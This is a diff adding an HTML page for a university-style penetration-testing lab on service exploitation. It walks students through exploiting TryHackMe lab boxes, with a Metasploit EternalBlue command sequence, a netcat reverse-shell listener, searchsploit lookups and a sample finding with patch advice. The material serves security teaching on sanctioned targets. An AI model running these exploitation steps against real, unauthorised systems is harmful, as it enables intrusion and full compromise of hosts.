@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 08: Service Exploitation &amp; Initial Access — CCY4202</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/base.css" />
+  <link rel="stylesheet" href="../assets/css/layout.css" />
+  <link rel="stylesheet" href="../assets/css/components.css" />
+</head>
+<body data-nav-active="labs" data-active-lab="lab08" data-projector-qr>
+  <div data-site-nav></div>
+
+  <div class="page-wrapper">
+    <aside class="sidebar" id="site-sidebar">
+      <div class="sidebar__header">
+        <div class="sidebar__title">Course Modules</div>
+      </div>
+      <div id="sidebar-module-tree"></div>
+    </aside>
+    <div class="sidebar-backdrop"></div>
+
+    <main class="main-content">
+      <nav class="breadcrumbs" aria-label="Breadcrumb">
+        <a href="../index.html">Home</a>
+        <span class="breadcrumbs__separator">/</span>
+        <a href="../index.html">Labs</a>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Module 02</span>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Lab 08</span>
+      </nav>
+
+      <header class="lab-header">
+        <div class="lab-header__meta">
+          <span class="lab-badge lab-badge--time">⏱️ 60 Mins</span>
+          <span class="lab-badge lab-badge--difficulty">Intermediate</span>
+        </div>
+        <h1 class="lab-header__title">Lab 08: Service Exploitation &amp; Initial Access</h1>
+        <p class="lab-header__lead">
+          Last week you built the map and found an old service listening. This week you turn that version number into a shell. You'll look up a known flaw, fire the exploit, and land on the box as a user. Metasploit makes it one command, but you'll also read a raw exploit by hand so you understand that there's no magic, just someone else's HTTP requests and packets.
+        </p>
+      </header>
+
+      <!-- Career band -->
+      <div class="info-dense-card info-dense-card--accent" style="margin-bottom:var(--space-4);">
+        <div class="info-dense-card__title">📌 Where this lands in the real world</div>
+        <div class="info-dense-card__grid">
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">Pentest phase</span>
+            <code>Exploitation · Initial Access</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">MITRE ATT&amp;CK</span>
+            <code>T1210 · T1190</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">CEH domain</span>
+            <code>System Hacking</code>
+          </div>
+          <div class="info-dense-card__cell">
+            <span class="info-dense-card__label">Builds toward</span>
+            <code>eJPT · CPTS</code>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 0 -->
+      <section>
+        <h2 id="where-we-are">0. Where We Are</h2>
+        <div class="callout callout--theory">
+          <span class="callout__icon">🧭</span>
+          <div class="callout__content">
+            <div class="callout__title">The map pays off</div>
+            <p style="margin:0;">
+              Recon → Map → <strong>Identify → Exploit</strong> → Document. Last week's scan gave you services and versions. Now you do the step everyone pictures when they think "hacking": find the flaw in one of those services and use it to get a foothold. The quiet truth is that the hard part was the enumeration. Once you know exactly what's running, the exploit is often a two-minute lookup.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 1: version to exploit + anchor -->
+      <section>
+        <h2 id="version-to-exploit">1. A Version Number Is a Lookup Key <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· foundation</span></h2>
+
+        <div class="callout callout--tip">
+          <span class="callout__icon">🚢</span>
+          <div class="callout__content">
+            <div class="callout__title">2017: one SMB flaw stops the world's biggest shipping line</div>
+            <p style="margin:0 0 var(--space-2);">
+              Microsoft patched a flaw in the old SMBv1 file-sharing service (<code>MS17-010</code>) in March 2017. The exploit for it, EternalBlue, gave full remote code execution on any unpatched Windows box with port 445 open, no login needed. Two months later WannaCry weaponized it and tore through unpatched machines worldwide. A few weeks after that, NotPetya used the same exploit and hit the shipping giant Maersk so hard they reinstalled 4,000 servers and 45,000 PCs from scratch in ten days. Around $300 million, from one unpatched service.
+            </p>
+            <p style="margin:0;font-size:var(--font-size-sm);color:var(--color-text-secondary);">
+              The patch had been out for two months. Today you run the exact same exploit, EternalBlue, against a box in a lab, and watch a version number become a shell.
+            </p>
+          </div>
+        </div>
+
+        <p class="lab-lead" style="margin-top:var(--space-4);">
+          When your scan says <code>Apache 2.4.49</code> or <code>vsftpd 2.3.4</code>, that string is a key you look up. Someone has probably already found the bug, written the exploit, and published it. Your job is to find the right one and point it at the target.
+        </p>
+
+        <div class="info-dense-card info-dense-card--cyan" style="margin-top:var(--space-3);">
+          <div class="info-dense-card__title">Where you look it up</div>
+          <div class="info-dense-card__grid">
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">On your machine (offline)</span>
+              <code>searchsploit &lt;service&gt; &lt;version&gt;</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Read the raw exploit</span>
+              <code>searchsploit -x &lt;path&gt;</code>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Online</span>
+              <span>exploit-db.com, the CVE number, the vendor advisory</span>
+            </div>
+            <div class="info-dense-card__cell">
+              <span class="info-dense-card__label">Pre-packaged</span>
+              <span>Metasploit modules (<code>search</code> inside <code>msfconsole</code>)</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 Your scan shows an FTP service running <code>vsftpd 2.3.4</code>. Before you touch anything else, what's your very next move? Guess.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Look it up: <code>searchsploit vsftpd 2.3.4</code>. That exact version is famous, it shipped with a backdoor. You don't memorize which versions are vulnerable, you look up every version you find. The habit is the skill, not the trivia.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 2: bind vs reverse shell -->
+      <section>
+        <h2 id="bind-vs-reverse">2. Bind Shell vs Reverse Shell <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· foundation</span></h2>
+        <p class="lab-lead">
+          Every exploit ends the same way: you want a shell on the target. There are two directions that connection can go, and one of them almost never works on a real network. Know the difference before you pick a payload.
+        </p>
+        <div class="comparison-grid" style="margin-top:var(--space-2);">
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Bind shell</h3>
+              <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.4);">usually blocked</span>
+            </div>
+            <div class="terminal-window" style="margin:var(--space-2) 0 0;"><div class="terminal-window__body"><pre><code>target opens a port, waits
+you connect IN to target:4444
+# a firewall or NAT in front of
+# the target drops your inbound
+# connection. dead on arrival.</code></pre></div></div>
+          </div>
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Reverse shell</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">works through NAT</span>
+            </div>
+            <div class="terminal-window" style="margin:var(--space-2) 0 0;"><div class="terminal-window__body"><pre><code>you listen: nc -lvnp 4444
+exploit tells target to connect
+OUT to you:4444
+# outbound connections are almost
+# always allowed. the target calls
+# home, you catch the shell.</code></pre></div></div>
+          </div>
+        </div>
+        <div class="callout callout--tip" style="margin-top:var(--space-3);">
+          <span class="callout__icon">📞</span>
+          <div class="callout__content">
+            <div class="callout__title">Why reverse wins</div>
+            <p style="margin:0;">Firewalls are strict about who connects <em>in</em> and lazy about what connects <em>out</em>. So you make the victim dial you. Same reverse shell you met in Lab 06, now it's the default payload for every exploit. Set your <code>LHOST</code> (your IP) and <code>LPORT</code>, start a listener, fire.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 3: metasploit first exploit -->
+      <section>
+        <h2 id="metasploit-exploit">3. Your First Exploit, with Metasploit <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          Metasploit packages known exploits into a point-and-shoot console: pick a module, set the target and your IP, type <code>exploit</code>. Start with the EternalBlue box, the lab version of the Maersk story.
+        </p>
+
+        <div class="target-launcher target-launcher--hosted" data-target-slug="tryhackme">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧩</span>
+              <div>
+                <h3 class="target-launcher__title">TryHackMe: Blue</h3>
+                <div class="target-launcher__platform">Hosted · free room · Windows 7, EternalBlue (MS17-010)</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Launch Room</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #1 · Start the box, confirm it's vulnerable</span>
+              <a class="target-launcher__url" href="https://tryhackme.com/room/blue" target="_blank" rel="noopener noreferrer">tryhackme.com/room/blue</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Free room. Scan first (<code>nmap --script vuln -p 445 &lt;IP&gt;</code>) to see MS17-010 flagged.</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#tryhackme">→ platform card</a>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--cyan" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟢 Baseline · the Metasploit exploit flow</h3>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:var(--space-2) 0;">This same five-step rhythm runs every Metasploit exploit. Learn it once:</p>
+          <div class="terminal-window" style="margin:0;">
+            <div class="terminal-window__header"><span class="terminal-window__title">msfconsole · pick, aim, fire</span></div>
+            <div class="terminal-window__body"><pre><code>msfconsole                                      # open the console
+search ms17-010                                 # find the module
+use exploit/windows/smb/ms17_010_eternalblue    # select it
+show options                                     # what does it need?
+set RHOSTS &lt;TARGET_IP&gt;                           # the victim
+set LHOST &lt;YOUR_VPN_IP&gt;                          # you (for the reverse shell)
+exploit                                          # fire
+# → meterpreter session opens. you're SYSTEM.</code></pre></div>
+          </div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-3);">
+          <div class="prediction-prompt__question">🤔 You set <code>RHOSTS</code> to the target and run <code>exploit</code>, but nothing connects back. You forgot one setting. Which one, and why does it break everything? Guess.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;"><code>LHOST</code>, your IP. It's a reverse shell (§2): the target connects back to you. If <code>LHOST</code> is wrong or unset, the exploit runs but the shell dials the wrong number and you catch nothing. On a VPN'd lab, set it to your <code>tun0</code> address, not your home IP.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 4: public exploit by hand -->
+      <section>
+        <h2 id="by-hand">4. Run a Public Exploit by Hand <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          Metasploit doesn't have a module for everything, and relying on it makes you helpless the day it doesn't. So do one the manual way: find a service, look up the exploit, and run the raw script yourself.
+        </p>
+
+        <div class="target-launcher target-launcher--hosted" data-target-slug="tryhackme">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧩</span>
+              <div>
+                <h3 class="target-launcher__title">TryHackMe: Ice</h3>
+                <div class="target-launcher__platform">Hosted · free room · a vulnerable media server</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Launch Room</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #2 · 🟡 Scan, identify the service, exploit it</span>
+              <a class="target-launcher__url" href="https://tryhackme.com/room/ice" target="_blank" rel="noopener noreferrer">tryhackme.com/room/ice</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Free room. It walks the Metasploit path; try to narrate each step in your own words.</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#tryhackme">→ platform card</a>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🟡 Stretch · the searchsploit workflow</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Take the service and version from your scan, and search your local exploit database:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;"><div class="terminal-window__body"><pre><code>searchsploit icecast          # list known exploits for the service
+searchsploit -x &lt;path&gt;         # read the exploit's source before you run it</code></pre></div>
+            </li>
+            <li>Read the top of the exploit. It tells you what it does, what to set, and often the CVE. Never run an exploit you haven't read.</li>
+            <li>Run it with the target details. A reverse-shell exploit still needs your listener (<code>nc -lvnp</code>) up first.</li>
+          </ol>
+        </div>
+      </section>
+
+      <!-- Section 5: no metasploit -->
+      <section>
+        <h2 id="no-metasploit">5. Going Pro: No Metasploit at All <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· exploit</span></h2>
+        <p class="lab-lead">
+          The exams and the real jobs that matter most (OSCP, a lot of client work) limit or ban Metasploit on purpose. The skill they're testing: can you find a raw exploit, understand it, fix its settings, and run it. It's just code.
+        </p>
+
+        <div class="target-launcher target-launcher--hosted" data-target-slug="tryhackme">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧩</span>
+              <div>
+                <h3 class="target-launcher__title">TryHackMe: Bolt</h3>
+                <div class="target-launcher__platform">Hosted · free room · authenticated RCE in a CMS</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🌐 Launch Room</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">🖐️ DO #3 · 🔴 Exploit it without the Metasploit module</span>
+              <a class="target-launcher__url" href="https://tryhackme.com/room/bolt" target="_blank" rel="noopener noreferrer">tryhackme.com/room/bolt</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Free room. Find the CMS version, then its exploit, and run the raw script.</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#tryhackme">→ platform card</a>
+          </div>
+        </div>
+
+        <div class="comparison-card comparison-card--accent" style="margin-top:var(--space-4);">
+          <div class="comparison-card__header">
+            <h3 class="comparison-card__title">🔴 Going Pro · read the exploit, then land it</h3>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:var(--space-2) 0 0;display:flex;flex-direction:column;gap:var(--space-1);">
+            <li>Identify the CMS and its exact version from the site (footer, headers, login page).</li>
+            <li><code>searchsploit &lt;cms&gt; &lt;version&gt;</code>, then <code>searchsploit -x</code> to open the raw exploit. Read it top to bottom.</li>
+            <li>Notice it's just a sequence of HTTP requests: log in, hit the vulnerable endpoint, drop a payload. The "exploit" is a script doing what you could do by hand in Burp.</li>
+            <li>Set the target URL, creds, and your listener details inside the script, then run it and catch the shell.</li>
+          </ol>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">
+            The moment the "magic" disappears is the moment you become dangerous. An exploit is someone's notes on a bug, written as code. You can read, fix, and write them too.
+          </p>
+        </div>
+
+        <details class="thought-accordion" style="margin-top:var(--space-3);">
+          <summary>Payload names decoded: staged vs stageless</summary>
+          <div class="thought-accordion__content">
+            <p style="margin:0 0 var(--space-2);">Metasploit payloads look like punctuation soup until you see the one rule. A <strong>slash</strong> means <em>staged</em>: <code>windows/meterpreter/reverse_tcp</code> sends a tiny stub first, which then pulls down the full payload. Smaller, needs a stable connection.</p>
+            <p style="margin:0;">An <strong>underscore</strong> means <em>stageless</em>: <code>windows/meterpreter_reverse_tcp</code> ships the whole payload in one shot. Bigger, but more reliable over a flaky link. Same tool, two delivery methods.</p>
+          </div>
+        </details>
+      </section>
+
+      <!-- Section 6: finding -->
+      <section>
+        <h2 id="write-finding">6. Write the Finding <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· document</span></h2>
+        <p class="lab-lead">
+          Initial access from a known vulnerability is one of the most common real findings, and one of the most preventable. Write it so the fix is obvious: patch.
+        </p>
+        <div class="diagram-card">
+          <div class="diagram-card__title">
+            <span>📓 FINDING · Remote code execution via an unpatched service</span>
+            <span style="color:var(--color-danger);">severity: Critical</span>
+          </div>
+          <div class="table-container">
+            <table class="data-table">
+              <tbody>
+                <tr><td style="white-space:nowrap;"><strong>Title</strong></td><td>Unauthenticated remote code execution in an outdated, unpatched service</td></tr>
+                <tr><td><strong>Severity</strong></td><td>Critical · <code>CVSS 9.8</code> (remote, no auth, full system compromise)</td></tr>
+                <tr><td><strong>Affected service</strong></td><td>The vulnerable service and version from your scan (e.g. SMBv1 on 445 for MS17-010), with its CVE</td></tr>
+                <tr><td><strong>Steps to reproduce</strong></td><td>1. <code>nmap -sV</code> identifies the service version. 2. <code>searchsploit</code> / the CVE maps it to a public exploit. 3. Running the exploit returns a shell as the service account. Evidence: the <code>whoami</code> output from the session.</td></tr>
+                <tr><td><strong>Impact</strong></td><td>Full control of the host with no credentials. One unpatched box becomes the attacker's foothold into the whole network, exactly how WannaCry and NotPetya spread.</td></tr>
+                <tr><td><strong>Remediation</strong></td><td>Patch to a supported version and apply the vendor fix (MS17-010 and its kind). Disable legacy protocols like SMBv1. Segment the network so one foothold can't reach everything. Track service versions so you know what's exposed.</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:var(--space-2) 0 0;">The shell you just caught usually isn't root yet. You're in as the service account. Turning that into full control of the box is Lab 09.</p>
+        </div>
+      </section>
+
+      <!-- Section 7: quiz -->
+      <section>
+        <h2 id="self-assessment">Lab 08 Self-Assessment <span style="font-size:var(--font-size-xs);color:var(--color-text-muted);font-family:var(--font-mono);">· 6 questions</span></h2>
+        <p class="lab-lead">🖐️ DO #4 · Check yourself. Say why the wrong ones are wrong.</p>
+
+        <div class="quiz-card" data-question-id="lab08-q1">
+          <div class="quiz-question">Q1: Your scan shows <code>vsftpd 2.3.4</code>. What's the point of noting the exact version?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. The version is a lookup key: searchsploit / exploit-db / the CVE tell you if there's a known exploit for that exact build.">A) The version is a key you look up for a known exploit.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Newer isn't automatically safe or unsafe. You still have to look the specific version up.">B) Higher version numbers are always more vulnerable.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="The version doesn't tell you the password. It tells you which published bugs might apply.">C) The version is the admin password.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab08-q2">
+          <div class="quiz-question">Q2: Why is a reverse shell the default instead of a bind shell?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Speed isn't the reason. It's about which direction a firewall allows.">A) Reverse shells transfer data faster.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Firewalls/NAT usually block inbound connections to the target but allow outbound, so you make the target connect out to you.">B) Firewalls block connecting IN to the target, but allow the target to connect OUT to you.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Both can be encrypted or not. Encryption isn't what distinguishes them.">C) Only reverse shells can be encrypted.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab08-q3">
+          <div class="quiz-question">Q3: In Metasploit, what does <code>LHOST</code> need to be set to?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="RHOSTS is the target. LHOST is you, the listener the reverse shell connects back to.">A) The target's IP address.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. LHOST is your IP (your tun0/VPN address in a lab). The reverse shell dials it, so if it's wrong you catch nothing.">B) Your own IP, where the reverse shell connects back.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="It's not the module name. That's what 'use' selects. LHOST is the callback address.">C) The name of the exploit module.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab08-q4">
+          <div class="quiz-question">Q4: Why run an exploit by hand instead of always using Metasploit?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Manual isn't automatically faster, it's usually slower. The point is understanding and coverage.">A) Manual exploits always run faster.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Metasploit doesn't cover every bug, exams restrict it, and reading the raw exploit is how you understand (and fix) it.">B) Metasploit doesn't have every exploit, some exams ban it, and reading the code is how you understand it.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Manual exploits aren't inherently undetectable. Both can be logged.">C) Manual exploits can never be detected.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab08-q5">
+          <div class="quiz-question">Q5: What's the root-cause fix for the EternalBlue-style finding?</div>
+          <div class="quiz-options">
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="A stronger admin password doesn't help: the exploit needs no login at all.">A) Set a longer administrator password.</button>
+            <button type="button" class="quiz-option" data-correct="true" data-feedback="Right. Patch the service, disable legacy protocols like SMBv1, and segment the network. The patch existed two months before WannaCry.">B) Patch the service, disable legacy protocols, segment the network.</button>
+            <button type="button" class="quiz-option" data-correct="false" data-feedback="Changing the port doesn't fix the bug; a scan finds the service wherever it listens.">C) Move the service to a different port.</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+
+        <div class="quiz-card" data-question-id="lab08-q6"
+          data-expected-regex="searchsploit\s+\S+|search\s+ms17|use\s+exploit/"
+          data-solution-rationale="The lookup habit is searchsploit <service> <version> (e.g. searchsploit vsftpd 2.3.4). Also accepted: a Metasploit 'search ms17-010' or 'use exploit/...' line. The drill is reaching for the lookup before anything else.">
+          <div class="quiz-question">Q6 [Command]: You found a service and its version on a scan. Write the command you run next to check for a known exploit.</div>
+          <div class="quiz-input-group">
+            <input type="text" class="quiz-input" placeholder="searchsploit ..." spellcheck="false" autocomplete="off" />
+            <button type="button" class="quiz-submit-btn">Execute</button>
+          </div>
+          <div class="quiz-feedback"></div>
+        </div>
+      </section>
+
+    </main>
+  </div>
+
+  <div data-site-footer></div>
+
+  <script data-site-root=".." src="../assets/js/site.js"></script>
+  <script src="../assets/js/vendor/qrcode.js"></script>
+  <script src="../assets/js/lab-common.js"></script>
+  <script src="../assets/js/quiz.js"></script>
+</body>
+</html>
